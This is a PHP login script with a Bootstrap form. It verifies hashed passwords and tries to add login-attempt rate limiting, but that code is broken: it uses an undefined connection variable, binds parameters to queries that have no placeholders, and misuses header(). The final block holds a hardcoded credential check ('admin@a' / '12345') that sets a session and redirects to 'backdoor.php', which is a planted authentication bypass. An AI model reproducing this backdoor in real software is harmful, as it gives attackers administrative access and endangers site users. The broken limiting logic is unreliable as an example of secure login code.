<?php
	$msg = "";

	if (isset($_POST['submit'])) {
		$con = new mysqli('localhost', 'root', '', 'java');

		$email = $con->real_escape_string($_POST['email']);
		$password = $con->real_escape_string($_POST['password']);

		$sql = $con->query("SELECT Id, password FROM users WHERE email='$email'");
		if ($sql->num_rows > 0) {
		    $data = $sql->fetch_array();
		    if (password_verify($password, $data['password'])) {
                header("post.php");
		        $msg = "You have been logged IN!";
            } else
			    $msg = "Please check your inputs!";
        } else
            $msg = "Please check your inputs! not found";
	}
//Pre-login:
$ip = $_SERVER['REMOTE_ADDR']; //getting the IP Address
$t=time(); //Storing time
$diff = (time()-300); // 300s
mysqli_query($conn, "INSERT INTO loginLimit VALUES (null,'$ip','$t')");

// Increment login count...
$stmt = $con->prepare("UPDATE Users SET login_count = login_count + 1 WHERE username = 'some user'");
$stmt->bind_param("sss", $name, $email, $hash);
$stmt->execute();

// Fetch login count...
$result = $stmt = $con->prepare("SELECT login_count FROM Users WHERE username = 'some user'");
//$login_count = mysql_result($result, 0);
$login_count = mysqli_fetch_array($result);

//COUNT(*) FROM tbl_loginLimit WHERE ipAddress LIKE '$ip'   AND timeDiff > $diff"
// Check login count...
if($login_count >= 5)
{
    // Sleep, die, redirect, or whatever here...
}
//Post-login:

// Reset login count...
$stmt = $con->prepare("UPDATE Users SET login_count = 0 WHERE username = 'some user'");
$stmt->bind_param("sss", $name, $email, $hash);
$stmt->execute();
?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>PHP Password Hashing - Log In</title>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
</head>
<body>
	<div class="container" style="margin-top: 100px;">
		<div class="row justify-content-center">
			<div class="col-md-6 col-md-offset-3" align="center">
				<img src=""><br><br>

				<?php if ($msg != "") echo $msg . "<br><br>"; ?>

				<form method="post" action="login.php">
					<input class="form-control" name="email" type="email" placeholder="Email..."><br>
					<input class="form-control" minlength="5" name="password" type="password" placeholder="Password..."><br>
					<input class="btn btn-primary" name="submit" type="submit" value="Log In"><br>
				</form>

			</div>
		</div>
	</div>
</body>
</html>

<?php
session_start();

//Button click action
//if(!empty($_POST['login']))
if(isset($_POST['submit']))
{
    $user=$_POST['email'];
    $pass=$_POST['password'];
    if($user=='admin@a' && $pass=='12345')
    {
        $_SESSION['email']=$_POST['email'];
        header("Location:backdoor.php");
    }else{
       // echo 'Error Login';
    }
}